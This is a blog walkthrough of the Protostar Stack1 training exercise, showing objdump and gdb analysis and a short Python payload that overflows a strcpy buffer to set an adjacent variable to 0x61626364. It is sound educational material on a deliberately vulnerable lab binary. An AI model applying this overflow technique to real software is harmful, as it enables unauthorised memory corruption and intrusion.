---
title: Protostar - Stack 1
date: 2024-02-14 10:30:00
categories: [binary-exploitation, protostar]
tags: [protostar, binary-exploitation, stack1]
---

## Conquering Stack1 at Protostar Machine

Greetings, hackers of the digital realm! Today, we will continue our journey  on [Protostar](https://exploit.education/protostar) machine  to conquer the [Stack1](https://exploit.education/protostar/stack-one/) binary.

This challenge requiring us to perform a stack overflow and override the next value in the buffer with specific value as we see later.

### **Challenge Overview**
- **Challenge Name:** [Stack1](https://exploit.education/protostar/stack-one/)
- **Machine:** [Protostar](https://exploit.education/protostar)

### Step 1: Explore Binary

let,s run stack1 binary and see it,s behavoior

![stack1 run](/assets/img/protostar/stack1-explore.png)

- We Found that the binary need an argument to work and after we run it with argument it run

### Step 2: Analysis
Disassemble stack1 binary

we can disassemble stack1 binary by `objdump`

```sh
objdump -M intel -d /opt/protostar/bin/stack1 | grep main -A 32
```

- `-M` stands for `--disassembler-options` we want `intel` syntax instead of `at&t`
- `-d` stand for `--disassemble`
- we grep `main` from the disassembled output because `main` as we know is the entrypoint for any `C` program and first function executed from it.

objdump output:

![Stack1 Objdump](/assets/img/protostar/stack1-objdump.png)
    
Analysis:

1. Function Prologue:

- `push ebp`  Save the base pointer.
- `mov ebp, esp`  Set up a new base pointer.
- `and esp, 0xfffffff0` Align the stack.
- `sub esp, 0x60` Allocate space for local variables.

2. Conditional Check:

- `cmp DWORD PTR [ebp+0x8],0x1`  Compare the value at `[ebp+0x8]` with `0x1`.
- `jne 8048487 <main+0x23>` Jump to `0x08048487` if the comparison is not equal.

3. Branches:

 If the condition is not met, the program jumps to `0x08048487`, Otherwise, it continues with the next instructions.

4. Function Calls and Memory Operations:

- `call 8048388 <errx@plt>` Calls the `errx` function.
- `call 8048368 <strcpy@plt>` Calls the `strcpy` function.
- `call 8048378 <printf@plt>` Calls the `printf` function.

5. Memory Comparisons:

- `mov eax,DWORD PTR [esp+0x5c]` move value at pointer `esp+0x5c` and store it in `eax`
- `cmp eax, 0x61626364`: Compare the value in `eax` with `0x61626364`.

6. Conditional Jumps:

- `jne 0x80484c0` <main+0x5c>: Jump to `0x080484c0` if the comparison is not equal.
- `jmp 0x80484d5` <main+0x71>: Jump to `0x080484d5` unconditionally.

7. Function Epilogue:

- `leave` Restore the stack frame. it is short for `mov esp,ebp` and `pop ebp`
- `ret` Return from the function.

Now we understand the flow of program :

1. during run it first check argument provided and if no args provided it call errx with a error message which print it and exit 
2. argument provided will be copied to buffer
3. check if `[esp+0x5c]==0x61626364` then call puts,print then return and else call print only and return 

`[esp+0x5c]` is interesting , we need to check to it when debugging

### Step 3: Debugging

- first let,s write simple script for fuzz let,s call it `fuzz.py`

`~/fuzz.py` :

```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print(fuzz)
```

- now let,s debug `stack1` binary useing `gdb`
```sh
gdb /opt/protostar/bin/stack1
```
now let,s disassemble main, and break point at mov eax,ptr dword[esp+0x5c]
```sh
set disassembly-flavor intel
disassemble main
```
![Stack1 on GDB](/assets/img/protostar/stack1-gdb-main.png)

now let,s breakpoint at `0x080484a7 <main+67>:	mov   eax,DWORD PTR [esp+0x5c]` to examine value at pointer `esp+0x5c` 
```sh
break *0x080484a7
```

now let,s run our program `stack1` with argument that contain our fuzzing value
```sh
run $(python ~/fuzz.py)
```

![Stack1 on gdb final](/assets/img/protostar/stack1-gdb-final.png)

show value at pointer at `esp+0x5c` with :

```sh
x/wx $esp+0x5c
```

when we get value at pointer at $esp+0x5c we found it = `0x51515151`

let,s get the ascii value of `0x51`

![Python chr(0x51)=Q](/assets/img/protostar/python-chr-51h.png)

so `0x51515151` represent `QQQQ` and  we need to make `esp+0x5c` = `0x61626364` to make the cmp instruction work truthy


### Step 4: Craft Solution 

okay let,s update our script: `~/fuzz.py`
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
esp_plus_5c="\x64\x63\x62\x61" # represent 0x61626364 on little endian machines
print(fuzz+esp_plus_5c)
```

now run `stack1` binary with our crafted soluation:

```sh
/opt/protostar/bin/stack1 $(python ~/fuzz.py)
```

and it Works !
![Stack1 Solved](/assets/img/protostar/stack1-solved.png)

